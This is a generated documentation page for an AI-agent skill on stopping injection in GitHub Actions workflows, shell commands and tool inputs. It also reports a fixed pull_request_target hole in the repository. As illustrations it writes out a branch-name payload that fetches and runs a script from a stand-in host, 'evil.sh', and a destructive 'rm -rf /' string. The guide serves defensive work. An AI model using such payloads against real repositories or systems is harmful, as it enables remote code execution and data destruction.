---
layout: default
generated: scripts/gen-skill-docs.ts — do not hand-edit; edit the skill
title: 'Untrusted input'
parent: Skill instructions
---

{: .note }
> Generated from [`cat-harness/skills/folio-core/untrusted-input.md`](https://github.com/litlfred/folio-assistant/blob/main/cat-harness/skills/folio-core/untrusted-input.md) — do not edit here.
>
> [✎ Edit this page's source](https://github.com/litlfred/folio-assistant/edit/main/cat-harness/skills/folio-core/untrusted-input.md){: .fa-edit-source }

{% raw %}
# Untrusted input — the value must never become program text

One defect, three substrates. In every case something **substitutes a value
into text that is then parsed as a program**, and a value chosen by an attacker
becomes code.

| substrate | the substitution | the fix |
|---|---|---|
| GitHub Actions | `${{ }}` is replaced in the script **before the shell sees it** | bind to `env:`, read `$VAR` |
| a shell command | building `"cmd " + arg` | pass argv as an **array** |
| a Tool input | a value that can contain `;` or `$(` | a **type that refuses it** |

## GitHub Actions — `${{ }}` is not interpolation, it is templating

This is the one people get wrong because the syntax looks like a variable.
`${{ github.event.pull_request.head.ref }}` is **substituted into the script's
text** before bash parses it. A branch named

```
x";curl evil.sh|sh;"
```

does not become a weird-looking string. It closes the quote and runs.

**Bind it to `env:` and read it as a shell variable.** Then bash receives the
value as *data* and never parses it as program.

```yaml
      env:
        HEAD_REF: ${{ github.event.pull_request.head.ref }}
      run: |
        BRANCH="$HEAD_REF"          # data, always
```

`WorldHealthOrganization/smart-base` does exactly this across its
slash-command workflows, with the comment *"Pass the branch name via env to
avoid script injection from untrusted data"* — worth reading, since a DAK
repository has the same fork-PR exposure this one does.

### What counts as attacker-controlled

Not everything in `github.*`. The audit is worth doing precisely because most
interpolations are fine and a blanket rule would be ignored.

- **Attacker-controlled:** `head.ref` (a fork's branch name), PR/issue **title**
  and **body**, comment bodies, label names, and **anything derived from them** —
  including a `steps.*.outputs.*` that merely passed one through.
- **Trusted:** `github.workspace`, `github.repository_owner`, `github.sha`,
  `github.event_name`, `matrix.*`, and an output your own workflow **sanitised**.

**The derived case is the one that hides.** Measured here 2026-09-18: this
repo's staging workflow bound `head.ref` to `env` in one step, then wrote the
**raw** branch to `$GITHUB_OUTPUT` and interpolated `steps.slug.outputs.branch`
two steps later. The sanitised `slug` output beside it was safe; the `branch`
output was the original value under a new name. **Sanitise at the boundary or
carry it in `env` the whole way — never both, half each.**

### `pull_request_target` is where this stops being theoretical

On `pull_request`, a fork PR gets a read-only token and no secrets, so an
injection runs on the runner and little else. **`pull_request_target` runs with
the base repository's token and secrets.** This repo's staging-cleanup job ran
on `pull_request_target: [closed]` with `contents: write` and interpolated a
fork branch name — so closing a PR from a branch with a crafted name was
arbitrary code execution with write access. Fixed the same day it was looked
for; it had been there for as long as the workflow had.

If a job runs on `pull_request_target`, treat every `github.event.*` field as
hostile and check the whole job, not the line you came to change.

## Command lines — argv arrays, and types that refuse payloads

Two lines of defence, and the order matters.

**Second line: argv arrays.** Never `exec("cmd " + arg)`. Spawn with an array,
so the value is one word and no shell parses it. `src/mcp/project.ts` has no
code path that produces a command *string* — a caller cannot hand one to a
shell because it never has one to hand over.

**First line, and the stronger one: the value cannot be dangerous.** An argv
array is a property of the *caller*, and a caller is one refactor away from a
template literal. A constrained **type** survives that refactor:

- `BeanStatus` is an enum. `"; rm -rf /"` is not a member.
- `BeanId` is `^[a-z0-9-]+$`. No space, no `;`, no `$(`, no backtick.
- `RepoPath` excludes shell metacharacters **and `..` segments** — traversal is
  the injection-shaped bug path types actually get hit with, and no amount of
  argv discipline prevents it.

So: **a Tool input that reaches argv may not reference an unconstrained type.**
`scripts/check-tools.ts` enforces it; `schemas/tool-types.ts` marks which types
qualify.

### Free prose is the honest exception

No pattern admits real markdown and excludes a payload. Rather than pretend,
`Markdown` is **not admissible as an argument** — a Tool that needs free text
declares `arg: { stdin: true }` and receives it on stdin, where it is data
rather than a command-line word. A type that claimed to be safe and was not
would be worse than one that says it isn't, because the claim is what makes the
next person skip the check.

## A workflow GitHub cannot parse does not fail loudly

Worth knowing before you edit any workflow, and it is how the fix above nearly
went wrong.

**A run whose name is a FILE PATH rather than the workflow's `name:` is a parse
failure.** GitHub had no `name:` to read. `AGENTS.md` records two workflows that
sat red for a day in 2026-08 this way; adding the `env:` bindings above
reproduced it, by putting a second `env:` on a step that already had one.

**`yaml.safe_load` accepted the file.** Duplicate keys are invalid YAML, but
most loaders silently keep the last — so "it parses locally" is not evidence
that GitHub will take it. `bun run check:workflows` uses a parser that reports
duplicates (`yaml`'s `parseDocument` with `uniqueKeys`), and is gated in CI.

Two hand-rolled attempts at that duplicate check reported false findings before
the real parser went in — `types:` under two different triggers, then `run:` in
two different steps. Both would have produced a wall of noise in a repository
with no duplicates at all, which is exactly how a check gets switched off. YAML
scoping is a parser's job.

## The test to apply

> **Is this value being placed into something that will be parsed?**

If yes, it must arrive as data — `env`, argv, stdin — or be of a type that
cannot express the parse. Quoting and escaping are what you reach for when
neither is available, and they are the option that keeps failing.
{% endraw %}
